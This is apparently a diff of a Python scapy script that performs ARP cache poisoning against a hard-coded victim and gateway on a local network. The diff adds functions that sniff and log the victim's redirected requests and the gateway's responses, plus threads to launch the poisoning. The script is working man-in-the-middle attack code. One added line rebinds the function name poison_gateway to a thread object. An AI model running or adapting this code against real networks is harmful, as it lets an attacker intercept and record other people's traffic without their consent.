@@ -1,6 +1,7 @@
 # main.py
 from scapy.all import *
-
+import threading
+#TODO: explain each function with docstring
 
 default_gateway_ip = "192.168.1.254"
 victim_mac = "3C:0A:F3:5A:CE:43"
@@ -44,3 +45,31 @@ def poison_gateway(gateway_ip, gateway_mac, victim_ip):
           hwdst=gateway_mac,
           hwsrc="3C:55:76:DE:12:EF"),
           inter=0.2, loop=1)
+
+
+def sniff_victim_requests(victim_ip, attacker_ip):
+    iface = conf.iface # get the interface to use for sending/sniffing this gets the default interface which is the name of your ethernet entry point or network card for wireless wifi conf.iface is the default if ommitted
+    bpf = f"ip and dst host {attacker_ip} and src host {victim_ip}" # a Berkely Packet Filter is applied to only sniff specific packets that meet those requirements
+
+    def write_packet_to_victim_requests_file(packet):
+        with open("victim_requests.txt", "a") as file:
+            file.write(f"{packet.summary()}\n")
+        return packet.summary()
+
+    sniff(iface=iface, filter=bpf, prn=write_packet_to_victim_requests_file) # print result function calls a function everytime a packet is sniffed
+
+
+def sniff_gateway_responses(gateway_ip, attacker_ip):
+    bpf = f"ip and dst host {attacker_ip} and src host {gateway_ip}"
+
+    def write_packet_to_gateway_responses_file(packet):
+        with open("gateway_responses.txt", "a") as file:
+            file.write(f"{packet.summary()}\n")
+        return packet.summary()
+
+    sniff(filter=bpf, prn=write_packet_to_gateway_responses_file)
+
+
+
+victim_poisoning = threading.Thread(target=poison_victim)
+poison_gateway = threading.Thread(target=poison_gateway)
